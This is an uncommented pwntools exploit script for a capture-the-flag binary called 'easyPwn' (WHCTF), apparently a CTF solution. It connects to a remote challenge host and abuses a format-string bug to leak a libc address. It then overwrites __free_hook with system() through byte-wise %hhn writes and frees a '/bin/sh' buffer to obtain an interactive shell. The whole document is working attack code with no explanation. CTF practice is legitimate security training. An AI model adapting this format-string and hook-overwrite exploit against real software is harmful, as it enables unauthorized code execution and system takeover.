from pwn import *
#  context.log_level='debug'    
context.terminal = ['terminator','-x','bash','-c']
local = 0
if local:
    cn = process('./pwn1')
    bin = ELF('./pwn1')
    libc = ELF('./libc.so')
else:
    cn = remote("111.198.29.45","36432")
    bin = ELF('./easyPwn')
    libc = ELF('./libc.so.6')
def z(a=''):
    gdb.attach(cn,a)
    raw_input()
######################## 
cn.recvuntil('Code:')
cn.sendline('1')
cn.recvuntil('WHCTF')
pay = 'a'*1000+'bb%397$p'
pay = pay.ljust(1024,'\x00')
cn.sendline(pay)
cn.recvuntil('0x')
data = int(cn.recvuntil('\n')[:-1],16)
libc_base = data - libc.symbols['__libc_start_main']-240
success('libc_base: ' + hex(libc_base))
system = libc_base + libc.symbols['system']
success('system: ' + hex(system))
freehook = libc_base + libc.symbols['__free_hook']
success('freehook: ' + hex(freehook))
################ 
for i in range(8):
    cn.recvuntil('Code:')
    cn.sendline('1')
 
    p_system = p64(system)
    cn.recvuntil('WHCTF')
    pay = 'a'*1000
    pay += 'BB%'+str(0x100-0xfe+ord(p_system[i]))+'c%133$hhn'
    pay = pay.ljust(1016,'A')
    pay += p64(freehook+i)
    pay = pay.ljust(1024,'a')
    print len(pay)
    cn.sendline(pay)
cn.sendline('2')
cn.sendline('/bin/sh\x00')
cn.interactive()